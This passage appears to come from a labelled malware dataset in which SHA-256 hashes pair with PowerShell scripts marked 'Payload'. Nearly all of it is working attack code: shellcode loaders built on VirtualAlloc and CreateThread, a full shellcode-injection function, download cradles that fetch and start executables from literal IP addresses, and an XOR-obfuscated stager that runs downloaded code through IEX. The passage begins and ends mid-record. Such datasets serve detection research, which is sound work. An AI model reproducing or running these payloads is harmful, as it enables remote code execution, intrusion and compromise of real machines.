0xb8,0xaa,0x0b,0x8a,0x46,0xd9,0xc3,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xa5,0xe9,0x7f,0xba,0x51,0x6f,0x7f,0x43,0xa1,0x10,0x09,0xa6,0x90,0x10,0x6d,0xa2,0x82,0xa0,0xe5,0xe6,0x2e,0x4a,0xab,0x12,0xa5,0x3e,0x64,0x14,0x0e,0xf4,0x52,0x1b,0x8f,0xa5,0xa7,0x3a,0x13,0xb4,0xfb,0x9c,0x2a,0x77,0x0e,0xdc,0x6b,0x6a,0xe3,0x8c,0x24,0xe0,0x56,0x21,0x41,0xbc,0x6a,0xca,0x19,0x50,0xeb,0x2f,0xe9,0x53,0xda,0xe1,0x62,0x0a,0xfc,0x00,0xa7,0x26,0xb5,0x1a,0xa4,0x03,0x0f,0x90,0x1e,0xff,0x8e,0x70,0x6f,0x00,0x3c,0xbd,0x40,0xf3,0x3c,0xf9,0x66,0xec,0x4a,0xf3,0x95,0x91,0x4c,0xc0,0xe4,0x4d,0xd8,0xd3,0x4e,0x05,0x7a,0x38,0x6f,0xca,0x1d,0xcb,0x63,0xa7,0x6a,0x93,0x67,0x36,0xbe,0xaf,0x93,0xb3,0x41,0x60,0x12,0x87,0x65,0xa4,0x7f,0x53,0x07,0xfd,0x25,0x32,0x38,0x1d,0x86,0xeb,0x9c,0x55,0x2a,0xff,0xac,0x37,0x22,0xcc,0x9c,0xc7,0xb2,0x5a,0x96,0xb4,0x80,0xc5,0x0c,0x53,0xa8,0x8e,0x8a,0xa4,0xcf,0xa4,0x6b,0x3a,0x2e,0x47,0x8c,0x12,0xf4,0x13,0xdc,0x0c,0xdd,0x1b,0xb7,0xcc,0xe2,0xc9,0x22,0xc8,0x74,0x52,0x02,0x24,0x63,0xfa,0x61,0xc9,0x7a,0xa7,0xec,0x2f,0x2c,0x07,0xbf,0xff,0x8c,0xf7,0x7f,0x50,0x64,0x12,0x70,0x8f,0x94,0x1d,0x5a,0xb8,0x3e,0xf2,0x33,0x90,0xd6,0x6b,0x1e,0x6a,0x47,0x73,0xb4,0x16,0x47,0xff,0x3b,0xe6,0x09,0x08,0x31,0xf4,0xfd,0xf8,0x0c,0xa6,0xab,0x07,0xbb,0xcd,0x53,0x92,0x40,0x44,0x04,0x0a,0x4b,0xb1,0x62,0x95,0xb4,0x94,0xf9,0x1c,0x21,0x57,0x95,0x60,0xa5,0x57,0x65,0x37,0xaf,0x57,0x0d,0xef,0x8b,0x0b,0x28,0xf0,0x01,0x38,0xe1,0x65,0xaa,0x69,0x56,0x2d,0xc2,0x97,0x81,0x19,0x4d,0x67,0xe4,0x9b,0xb1,0xbe,0xc0,0xe9,0xdb,0x02;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$eEvp=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($eEvp.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$eEvp,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
f150c926cfe5a29f0275f5e2736da8ce9eb5dacd9675fc7966611d6befe64ee7,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
afdcf3bde6563f6dd5d9483366bc21dca7d09ae14c440a0a7a051a7814408c6c,"function Invoke-Shellcode
{


[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0

    if ( $PSBoundParameters['ProcessID'] )
    {
        
        
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString(""X$($IntSizePtr*2)"") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      
            $CallStub += ConvertTo-LittleEndian $BaseAddr       
            $CallStub += 0xFF,0xD0                              
            $CallStub += 0x6A,0x00                              
            $CallStub += 0x48,0xB8                              
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr 
            $CallStub += 0xFF,0xD0                              
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           
            $CallStub += ConvertTo-LittleEndian $BaseAddr       
            $CallStub += 0xFF,0xD0                              
            $CallStub += 0x6A,0x00                              
            $CallStub += 0xB8                                   
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr 
            $CallStub += 0xFF,0xD0                              
        }
        
        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) 
        
        if (!$hProcess)
        {
            Throw ""Unable to open a process handle for PID: $ProcessID""
        }

        $IsWow64 = $false

        if ($64bitOS) 
        {
            
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) 
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else 
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else 
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) 
        
        if (!$RemoteMemAddr)
        {
            Throw ""Unable to allocate shellcode memory in PID: $ProcessID""
        }
        
        Write-Verbose ""Shellcode memory reserved at 0x$($RemoteMemAddr.ToString(""X$([IntPtr]::Size*2)""))""

        
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) 
        
        if (!$RemoteStubAddr)
        {
            Throw ""Unable to allocate thread call stub memory in PID: $ProcessID""
        }
        
        Write-Verbose ""Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString(""X$([IntPtr]::Size*2)""))""

        
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw ""Unable to launch remote thread in PID: $ProcessID""
        }

        
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }
    
        
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) 
        if (!$BaseAddress)
        {
            Throw ""Unable to allocate shellcode memory in PID: $ProcessID""
        }
        
        Write-Verbose ""Shellcode memory reserved at 0x$($BaseAddress.ToString(""X$([IntPtr]::Size*2)""))""

        
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
        
        
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) 
        if (!$CallStubAddress)
        {
            Throw ""Unable to allocate thread call stub.""
        }
        
        Write-Verbose ""Thread call stub memory reserved at 0x$($CallStubAddress.ToString(""X$([IntPtr]::Size*2)""))""

        
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw ""Unable to launch thread.""
        }

        
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null 
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null 

        Write-Verbose 'Shellcode injection complete!'
    }

    
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    $AddressWidth = $null

    try {
        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    } catch {
        throw 'Unable to determine OS processor address width.'
    }

    switch ($AddressWidth) {
        '32' {
            $64bitOS = $False
        }

        '64' {
            $64bitOS = $True

            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }

        default {
            throw 'Invalid OS address width detected.'
        }
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PSBoundParameters['Shellcode'])
    {
        
        
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    else
    {
        
        
        
        
        
        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)

        
        
        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose ""Injecting shellcode into PID: $ProcessId""
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 ""Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!"" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose ""Injecting shellcode into PowerShell""
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 ""Injecting shellcode into the running PowerShell process!"" ) )
        {
            Inject-LocalShellcode
        }
    }   
}
",Payload
9233966b97f5e7d306c871998539d8a2310ad766fffcc502cb7ba1474fd6fa72,"
$wc=New-ObJect SyStEM.NeT.WEbCLIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdERs.ADd('User-Agent',$u);$WC.ProXy = [SYSteM.NeT.WebREqUesT]::DefauLTWEBPrOXy;$wC.PROxy.CrEdEntiAls = [SySTeM.NET.CreDentiAlCaCHe]::DEFAuLtNeTwORkCReDENtIAlS;$K='E*6U\^8XVl?|o/gY~5-xQ3%PuhqL,0j>';$i=0;[cHAr[]]$b=([chAR[]]($Wc.DOWNLoADSTRING(""http://139.59.12.202:80/index.asp"")))|%{$_-bXOR$k[$I++%$k.LEnGTH]};IEX ($b-jOIn'')

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
85ddac0c50f7a8449246521989fd5c5fded65123cb890a43d77094452f7d11db,"
(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")

",Payload
4ebe9453ba2412c1e9e389137bd32f57fa39320a93f7cfc004e24cac8cbd25a7,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x68,0x68,0x02,0x00,0x1f,0x92,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
2061d98b6bb4f490a28cddec9454ee80bafe0a669fde6c44a8ae3262e3d0fb19,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 